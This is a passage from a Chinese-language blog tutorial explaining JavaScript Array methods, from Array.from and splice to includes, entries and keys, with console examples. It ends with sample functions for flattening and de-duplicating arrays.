和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map）。</p><p>Array.from的设计初衷是快速便捷的基于其他对象创建新数组，准确来说就是从一个类似数组的可迭代对象创建一个新的数组实例，只要一个对象有迭代器，Array.from就能把它变成一个数组（当然，是返回新的数组，不改变原对象）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let arrayLike = &#123;</span><br><span class="line">    &apos;0&apos;: &apos;a&apos;,</span><br><span class="line">    &apos;1&apos;: &apos;b&apos;,</span><br><span class="line">    &apos;2&apos;: &apos;c&apos;,</span><br><span class="line">    length: 3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// ES5的写法</span><br><span class="line">var arr1 = [].slice.call(arrayLike); // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line"></span><br><span class="line">// ES6的写法</span><br><span class="line">let arr2 = Array.from(arrayLike); // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;0: &apos;a&apos;, 1: &apos;b&apos;, 2:&apos;c&apos;, length: 3&#125;;</span><br><span class="line">Array.from(obj, (value) =&gt; value.repeat(3));</span><br></pre></td></tr></table></figure><h5 id="Array-isArray"><a href="#Array-isArray" class="headerlink" title="Array.isArray"></a>Array.isArray</h5><p>Array.isArray用来判断一个变量是否数组类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array.isArray([]);</span><br></pre></td></tr></table></figure></p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>数组原型提供的方法非常多，主要分为三种，一种是会改变自身值的，一种是不会改变自身值的，还有就是遍历方法。<br>由于 Array.prototype 的某些属性被设置为[[DontEnum]]，因此不能用一般的方法进行遍历，我们可以通过如下方式获取 Array.prototype 的所有方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Array.prototy;</span><br><span class="line"></span><br><span class="line">Object.getOwnPropertyNames(Array.prototype);</span><br></pre></td></tr></table></figure><p>#####改变自身值的方法(9个)<br>改变自身值的方法一共有9个，分别为pop、push、reverse、shift、sort、splice、unshift，以及两个ES6新增的方法copyWithin 和 fill。</p><p>#####pop<br>pop()方法删除一个数组中的最后的一个元素，并且返回这个元素。如果是栈的话，这个过程就是栈顶弹出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;cat&quot;, &quot;dog&quot;, &quot;cow&quot;, &quot;chicken&quot;, &quot;mouse&quot;];</span><br><span class="line">var item = array.pop();</span><br><span class="line">console.log(array); // [&quot;cat&quot;, &quot;dog&quot;, &quot;cow&quot;, &quot;chicken&quot;]</span><br><span class="line">console.log(item); // mouse</span><br></pre></td></tr></table></figure><p>#####push<br>push()方法添加一个或者多个元素到数组末尾，并且返回数组新的长度。如果是栈的话，这个过程就是栈顶压入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;football&quot;, &quot;basketball&quot;, &quot;volleyball&quot;, &quot;Table tennis&quot;, &quot;badminton&quot;];</span><br><span class="line">var i = array.push(&quot;golfball&quot;);</span><br><span class="line">console.log(array); // [&quot;football&quot;, &quot;basketball&quot;, &quot;volleyball&quot;, &quot;Table tennis&quot;, &quot;badminton&quot;, &quot;golfball&quot;]</span><br><span class="line">console.log(i); // 6</span><br></pre></td></tr></table></figure><p>#####reverse<br>reverse()方法颠倒数组中元素的位置，第一个会成为最后一个，最后一个会成为第一个，该方法返回对数组的引用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [1,2,3,4,5];</span><br><span class="line">var array2 = array.reverse();</span><br><span class="line">console.log(array); // [5,4,3,2,1]</span><br><span class="line">console.log(array2===array); // true</span><br></pre></td></tr></table></figure><p>#####shift<br>shift()方法删除数组的第一个元素，并返回这个元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [1,2,3,4,5];</span><br><span class="line">var item = array.shift();</span><br><span class="line">console.log(array); // [2,3,4,5]</span><br><span class="line">console.log(item); //</span><br></pre></td></tr></table></figure><p>#####sort<br>sort()方法对数组元素进行排序，并返回这个数组。</p><p>参数可选，如果省略，数组元素将按照各自转换为字符串的Unicode位点顺序排序，例如”Boy”将排到”apple”之前。当对数字排序的时候，25将会排到8之前，因为转换为字符串后，”25”将比”8”靠前。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;apple&quot;,&quot;Boy&quot;,&quot;Cat&quot;,&quot;dog&quot;];</span><br><span class="line">var array2 = array.sort();</span><br><span class="line">console.log(array); // [&quot;Boy&quot;, &quot;Cat&quot;, &quot;apple&quot;, &quot;dog&quot;]</span><br><span class="line">console.log(array2 == array); // true</span><br><span class="line">array = [10, 1, 3, 20];</span><br><span class="line">var array3 = array.sort();</span><br><span class="line">console.log(array3); // [1, 10, 20, 3]</span><br></pre></td></tr></table></figure><p>如果指明了comparefn，数组将按照调用该函数的返回值来排序。若 a 和 b 是两个将要比较的元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">若 comparefn(a, b) &lt; 0，那么a将排到b前面；</span><br><span class="line">若 comparefn(a, b) = 0，那么a和b相对位置不变；</span><br><span class="line">若 comparefn(a, b) &gt; 0，那么a,b将调换位置；</span><br></pre></td></tr></table></figure><p>#####splice<br>splice()方法用新元素替换旧元素的方式来修改数组。</p><p>语法：arr.splice(start,deleteCount[, item1[, item2[, …]]])<br>start指定从哪一位开始修改内容。如果超过了数组长度，则从数组末尾开始添加内容；如果是负值，则其指定的索引位置等同于length+start，表示从数组末尾开始的第 -start 位。</p><p>deleteCount:指定要删除的元素个数，若等于0，则不删除。这种情况下，至少应该添加一位新元素，若大于start之后的元素总和，则start及之后的元素都将被删除。</p><p>itemN: 指定新增的元素，如果缺省，则该方法只删除数组元素。</p><p>返回值: 由原数组中被删除元素组成的数组，如果没有删除，则返回一个空数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;apple&quot;,&quot;boy&quot;, &quot;girl&quot;];</span><br><span class="line">var splices = array.splice(1,1);</span><br><span class="line">console.log(array); //  [&quot;apple&quot;, &quot;girl&quot;]</span><br><span class="line">console.log(splices); // [&quot;boy&quot;] 可见是从数组下标为1的元素开始删除,并且删除一个元素,由于itemN缺省,故此时该方法只删除元素</span><br><span class="line"></span><br><span class="line">array = [&quot;apple&quot;,&quot;boy&quot;];</span><br><span class="line">splices = array.splice(2,1,&quot;cat&quot;);</span><br><span class="line">console.log(array); // [&quot;apple&quot;, &quot;boy&quot;, &quot;cat&quot;]</span><br><span class="line">console.log(splices); // [], 可见由于start超过数组长度,此时从数组末尾开始添加元素,并且原数组不会发生删除行为</span><br></pre></td></tr></table></figure><p>如果需要删除数组中一个已存在的元素，可参考:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var array = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;];</span><br><span class="line">array.splice(array.indexOf(&apos;b&apos;),1);</span><br></pre></td></tr></table></figure><p>#####unshift</p><p>unshift() 方法用于在数组开始处插入一些元素，并返回数组新的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;];</span><br><span class="line">var length = array.unshift(&quot;yellow&quot;);</span><br><span class="line">console.log(array); // [&quot;yellow&quot;, &quot;red&quot;, &quot;green&quot;, &quot;blue&quot;]</span><br><span class="line">console.log(length); // 4</span><br></pre></td></tr></table></figure><p>#####copyWithin(ES6)<br>在当前数组内部，将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组。使用这个方法，会修改当前数组。</p><p>它接受三个参数。<br>target（必需）：从该位置开始替换数据。<br>start（可选）：从该位置开始读取数据，默认为0。如果为负值，表示倒数。<br>end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示倒数</p><p>从target位置开始替换成从start 到end 的数据。</p><p>Array.prototype.copyWithin(target, start = 0, end = this.length)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var array = [1,2,3,4,5]; </span><br><span class="line">var array2 = array.copyWithin(0,3);</span><br><span class="line">console.log(array===array2,array2); // true [4, 5, 3, 4, 5]</span><br><span class="line">var array = [1,2,3,4,5]; </span><br><span class="line">console.log(array.copyWithin(0,3,4)); // [4, 2, 3, 4, 5]</span><br><span class="line">var array = [1,2,3,4,5]; </span><br><span class="line">console.log(array.copyWithin(0,-2,-1)); // [4, 2, 3, 4, 5]</span><br></pre></td></tr></table></figure><p>#####fill(ES6)</p><p>fill()基于ES6，fill方法使用给定值，填充一个数组。它同样用于数组元素替换，但与copyWithin略有不同，它主要用于将数组指定区间内的元素替换为某个值。<br>语法：arr.fill(value, start[, end = this.length])<br>value 指定被替换的值，start 指定替换元素起始的索引，end 可选，指的是替换元素结束位置的索引。<br>如果start为负，则其指定的索引位置等同于length+start，length为数组的长度。end也是如此。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;].fill(7)</span><br><span class="line">// [7, 7, 7]</span><br><span class="line"></span><br><span class="line">new Array(3).fill(7)</span><br><span class="line">// [7, 7, 7]</span><br><span class="line"></span><br><span class="line">var array = [1,2,3,4,5];</span><br><span class="line">var array2 = array.fill(10,0,3);</span><br><span class="line">console.log(array===array2,array2); // true [10, 10, 10, 4, 5], 可见数组区间[0,3]的元素全部替换为10</span><br><span class="line">// 其他的举例请参考copyWithin</span><br></pre></td></tr></table></figure><p>####不会改变自身的方法(9个)<br>不会改变自身的方法一共有9个。分别为concat、join、slice、toString、toLocateString、indexOf、lastIndexOf、未标准的toSource以及ES7新增的方法includes。</p><p>#####concat<br>concat() 方法将传入的数组或者元素与原数组合并，组成一个新的数组并返回。<br>语法：arr.concat(value1, value2, …, valueN)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [1, 2, 3];</span><br><span class="line">var array2 = array.concat(4,[5,6],[7,8,9]);</span><br><span class="line">console.log(array2); // [1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br><span class="line">console.log(array); // [1, 2, 3], 原数组并未被修改</span><br></pre></td></tr></table></figure><p>复制数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var array = [&#123;a: 1&#125;];</span><br><span class="line">var array3 = array.concat();</span><br><span class="line">console.log(array3); // [&#123;a: 1&#125;]</span><br><span class="line">console.log(array3 === array); // false</span><br><span class="line">console.log(array[0] === array3[0]); // true，新旧数组第一个元素依旧共用一个同一个对象的引用</span><br></pre></td></tr></table></figure></p><p>链接数组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2], b = [3,4];</span><br><span class="line">[...a, ...b]</span><br></pre></td></tr></table></figure></p><p>#####join<br>join() 方法将数组中的所有元素连接成一个字符串。<br>语法：arr.join([separator = ‘,’]) separator可选，缺省默认为逗号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;];</span><br><span class="line">console.log(array.join()); // a,b,c</span><br><span class="line">console.log(array.join(&apos;+&apos;)); // a+b+c</span><br><span class="line">console.log(array.join(&apos;&apos;)); // abc</span><br></pre></td></tr></table></figure><p>####slice<br>slice() 方法将数组中一部分元素浅复制存入新的数组对象，并且返回这个数组对象。<br>语法：arr.slice([start[, end]])<br>参数 start 指定复制开始位置的索引，end如果有值则表示复制结束位置的索引（不包括此位置）。<br>如果 start 的值为负数，假如数组长度为 length，则表示从 length+start 的位置开始复制，此时参数 end 如果有值，只能是比 start 大的负数，否则将返回空数组。<br>slice方法参数为空时，同concat方法一样，都是浅复制生成一个新数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;,&quot;four&quot;, &quot;five&quot;];</span><br><span class="line">console.log(array.slice()); // [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;,&quot;four&quot;, &quot;five&quot;]</span><br><span class="line">console.log(array.slice(2,3)); // [&quot;three&quot;]</span><br></pre></td></tr></table></figure></p><p>浅复制是指当对象的被复制时，只是复制了对象的引用，指向的依然是同一个对象。下面来说明slice为什么是浅复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var array = [&#123;color:&quot;yellow&quot;&#125;, 2, 3];</span><br><span class="line">var array2 = array.slice(0,1);</span><br><span class="line">console.log(array2); // [&#123;color:&quot;yellow&quot;&#125;]</span><br><span class="line">array[0][&quot;color&quot;] = &quot;blue&quot;;</span><br><span class="line">console.log(array2); // [&#123;color:&quot;bule&quot;&#125;]</span><br></pre></td></tr></table></figure><p>#####toString<br>toString()方法返回数组的字符串形式，该字符串由数组中的每个元素的 toString() 返回值经调用join()方法连接（由逗号隔开）组成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var array = [&apos;Jan&apos;, &apos;Feb&apos;, &apos;Mar&apos;, &apos;Apr&apos;];</span><br><span class="line">var str = array.toString();</span><br><span class="line">console.log(str); // Jan,Feb,Mar,Apr</span><br></pre></td></tr></table></figure><p>注：当数组直接和字符串作连接操作时，将会自动调用其toString()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var str = [&apos;Jan&apos;, &apos;Feb&apos;, &apos;Mar&apos;, &apos;Apr&apos;] + &apos;,May&apos;;</span><br><span class="line">console.log(str); // &quot;Jan,Feb,Mar,Apr,May&quot;</span><br></pre></td></tr></table></figure><p>#####toLocaleString<br>toLocaleString()类似toString()的变型，该字符串由数组中的每个元素toLocaleString()返回值经调用join()方法连接（由逗号隔开）组成。</p><p>数组中的元素将调用各自的toLocaleString方法：<br>Object：Object.prototype.toLocaleString()<br>Number：Number.prototype.toLocaleString()<br>Date：Date.prototype.toLocaleString()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var array= [&#123;name:&apos;zz&apos;&#125;, 123, &quot;abc&quot;, new Date()];</span><br><span class="line">var str = array.toLocaleString();</span><br><span class="line">console.log(str); // [object Object],123,abc,2017/9/1 下午1:06:23</span><br></pre></td></tr></table></figure></p><p>#####indexOf<br>indexOf() 方法用于查找元素在数组中第一次出现时的索引，如果没有，则返回-1。<br>语法：arr.indexOf(element, fromIndex=0)<br>element 为需要查找的元素。<br>fromIndex 为开始查找的位置，缺省默认为0。如果超出数组长度，则返回-1。如果为负值，假设数组长度为length，则从数组的第 length + fromIndex项开始往数组末尾查找，如果length + fromIndex&lt;0 则整个数组都会被查找。</p><p>indexOf使用严格相等（即使用 === 去匹配数组中的元素）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var array = [&apos;abc&apos;, &apos;def&apos;, &apos;ghi&apos;,&apos;123&apos;];</span><br><span class="line">console.log(array.indexOf(&apos;def&apos;)); // 1</span><br><span class="line">console.log(array.indexOf(&apos;def&apos;,-1)); // -1 此时表示从最后一个元素往后查找,因此查找失败返回-1</span><br><span class="line">console.log(array.indexOf(&apos;def&apos;,-4)); // 1 由于4大于数组长度,此时将查找整个数组,因此返回1</span><br><span class="line">console.log(array.indexOf(123)); // -1, 由于是严格匹配,因此并不会匹配到字符串&apos;123&apos;</span><br></pre></td></tr></table></figure><p>#####lastIndexOf<br>略</p><p>#####includes(ES7)<br>includes() 方法基于ES7规范，它用来判断当前数组是否包含某个指定的值，如果是，则返回 true，否则返回 false。<br>语法：arr.includes(element, fromIndex=0)<br>element 为需要查找的元素。<br>fromIndex 表示从该索引位置开始查找 element，缺省为0，它是正向查找，即从索引处往数组末尾查找。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var array = [0, 1, 2];</span><br><span class="line">console.log(array.includes(0)); // true</span><br><span class="line">console.log(array.includes(1)); // true</span><br><span class="line"></span><br><span class="line">[1, 2, 3].includes(3, 3);  // false</span><br><span class="line">[1, 2, 3].includes(3, -1); // true</span><br><span class="line">[1, 2, NaN].includes(NaN) // true</span><br></pre></td></tr></table></figure><p>####遍历方法(12个)<br>基于ES6，不会改变自身的方法一共有12个，分别为forEach、every、some、filter、map、reduce、reduceRight 以及ES6新增的方法entries、find、findIndex、keys、values。</p><p>#####entries(ES6)</p><p>entries() 方法基于ES6规范，返回一个数组迭代器对象，该对象包含数组中每个索引的键值对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];</span><br><span class="line">var iterator = array.entries();</span><br><span class="line">console.log(iterator.next().value); // [0, &quot;a&quot;]</span><br><span class="line">console.log(iterator.next().value); // [1, &quot;b&quot;]</span><br><span class="line">console.log(iterator.next().value); // [2, &quot;c&quot;]</span><br><span class="line">console.log(iterator.next().value); // undefined, 迭代器处于数组末尾时, 再迭代就会返回undefined</span><br></pre></td></tr></table></figure><p>#####find &amp; findIndex(ES6)<br>find()方法基于ES6规范，返回数组中第一个满足条件的元素（如果有的话），如果没有，则返回undefined。<br>findIndex() 方法也基于ES6规范，它返回数组中第一个满足条件的元素的索引（如果有的话）否则返回-1。</p><p>语法：arr.find(fn, thisArg)，arr.findIndex(fn, thisArg)<br>我们发现它们的语法与forEach等十分相似，其实不光语法，find（或findIndex）在参数及其使用注意事项上，均与forEach一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var array = [1, 3, 5, 7, 8, 9, 10];</span><br><span class="line">function f(value, index, array)&#123;</span><br><span class="line">  return value%2==0;</span><br><span class="line">&#125;</span><br><span class="line">function f2(value, index, array)&#123;</span><br><span class="line">  return value &gt; 20;</span><br><span class="line">&#125;</span><br><span class="line">console.log(array.find(f)); // 8</span><br><span class="line">console.log(array.find(f2)); // undefined</span><br><span class="line">console.log(array.findIndex(f)); // 4</span><br><span class="line">console.log(array.findIndex(f2)); // -1</span><br></pre></td></tr></table></figure><p>#####keys(ES6)<br>keys() 方法基于ES6规范，返回一个数组索引的迭代器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;abc&quot;, &quot;xyz&quot;];</span><br><span class="line">var iterator = array.keys();</span><br><span class="line">console.log(iterator.next()); // Object &#123;value: 0, done: false&#125;</span><br><span class="line">console.log(iterator.next()); // Object &#123;value: 1, done: false&#125;</span><br><span class="line">console.log(iterator.next()); // Object &#123;value: undefined, done: false&#125;</span><br></pre></td></tr></table></figure><p>#####values(ES6)<br>values() 方法基于ES6规范，返回一个数组迭代器对象，该对象包含数组中每个索引的值。其用法基本与上述 entries 方法一致。</p><p>(遗憾的是，现在没有浏览器实现了该方法)</p><p>#####Symbol.iterator(ES6)<br>该方法基于ES6规范，同 values 方法功能相同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var array = [&quot;abc&quot;, &quot;xyz&quot;];</span><br><span class="line">var iterator = array[Symbol.iterator]();</span><br><span class="line">console.log(iterator.next().value); // abc</span><br><span class="line">console.log(iterator.next().value); // xyz</span><br></pre></td></tr></table></figure><p>####js小实例之数组扁平化<br>？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line">console.log(flatten(arr)) // [1, 2, 3, 4]</span><br></pre></td></tr></table></figure><p>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 方法 1 地柜</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    for (var i = 0, len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">        if (Array.isArray(arr[i])) &#123;</span><br><span class="line">            result = result.concat(flatten(arr[i]))</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            result.push(arr[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 方法2 </span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    return arr.toString().split(&apos;,&apos;).map(function(item)&#123;</span><br><span class="line">        return item;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 方法3</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    return arr.reduce(function(prev, next)&#123;</span><br><span class="line">        return prev.concat(Array.isArray(next) ? flatten(next) : next)</span><br><span class="line">    &#125;, [])</span><br><span class="line">&#125;</span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 方法4</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line"></span><br><span class="line">    while (arr.some(item =&gt; Array.isArray(item))) &#123;</span><br><span class="line">        arr = [].concat(...arr);</span><br><span class="line">    &#125;</span><br><span class="line">    return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><p><a href="https://github.com/jashkenas/underscore/blob/master/underscore.js#L528" target="_blank" rel="noopener">underscore</a></p><p>###JavaScript之数组去重</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用indexOf()遍历数组，如果临时数组找不到该元素，则push到临时数组，否则不做处理</span><br><span class="line">function uniqArr1(arr) &#123;</span><br><span class="line">　　var res = [];</span><br><span class="line"> </span><br><span class="line">　　for (var i = 0,len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">        if (res.indexOf(arr[i]) == -1) &#123;</span><br><span class="line">          res.push(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">同样利用indexOf()遍历数组，如果元素首次出现位置和它的索引相等，则说明不是重复元素，push到临时数组，否则不做处理</span><br><span class="line"></span><br><span class="line">function uniqArr2(arr) &#123;</span><br><span class="line">　　var res = [arr[0]];</span><br><span class="line"> </span><br><span class="line">　　for (var i = 1,len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">　　　　if (arr.indexOf(arr[i]) == i) &#123;</span><br><span class="line">　　　　　　res.push(arr[i]);</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line"> </span><br><span class="line">　　return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查找第一个index，是否相同index</span><br><span class="line">function removeRepeat(arr)&#123;</span><br><span class="line">  return arr.filter(function(elem, pos) &#123;</span><br><span class="line">    return arr.indexOf(elem) == pos;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = new Array(&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;4&quot;,&quot;4&quot;,&quot;4&quot;,&quot;5&quot;);</span><br><span class="line">var newArr = removeRepeat(arr);</span><br><span class="line">console.log(newArr); //1,2,3,4,5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td 